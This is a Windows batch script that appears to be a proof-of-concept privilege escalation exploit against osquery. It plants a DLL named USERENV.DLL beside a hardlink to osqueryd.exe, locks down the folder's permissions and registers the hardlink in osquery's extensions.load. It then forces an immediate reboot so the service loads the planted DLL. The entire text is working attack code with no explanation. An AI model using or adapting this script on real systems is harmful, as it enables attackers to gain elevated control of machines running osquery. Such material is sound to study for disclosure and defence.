@echo off

set temp_dir=%TEMP%\osquery

if exist %temp_dir% goto dir_err

echo Setting up directory...
mkdir %temp_dir% || goto mkdir_err

echo Copying DLL...
copy /V PocDLL.dll %temp_dir%\USERENV.DLL || goto copy_err

echo Creating hardlink...
CreateHardlink.exe %temp_dir%\osq.exe %ProgramData%\osquery\osqueryd\osqueryd.exe || goto link_err

echo Setting up ACL...
icacls.exe %temp_dir% /inheritance:r || goto acl_err
icacls.exe %temp_dir% /grant:r %USERDOMAIN%\%USERNAME%:(CI)(RX) /grant:r %USERDOMAIN%\%USERNAME%:(OI)(CI)(R) || goto acl_err

echo Writing extensions.load...
echo %temp_dir%\osq.exe >> %ProgramData%\osquery\extensions.load || goto ext_err

echo The machine will restart in order to trigger a restart of osqueryd.exe
pause
shutdown /r /t 0
goto end


:dir_err
echo Directory %temp_dir% already exists, aborting
pause
goto end

:mkdir_err
echo ERROR: Failed to create directory %temp_dir%
pause
goto end

:copy_err
echo ERROR: Failed to copy DLL
pause
goto end

:link_err
echo ERROR: Failed to create hardlink
pause
goto end

:acl_err
echo ERROR: Failed to set ACLs on %temp_dir%
pause
goto end

:ext_err
echo ERROR: Failed to write to %ProgramData%\osquery\extensions.load
pause
goto end

:end
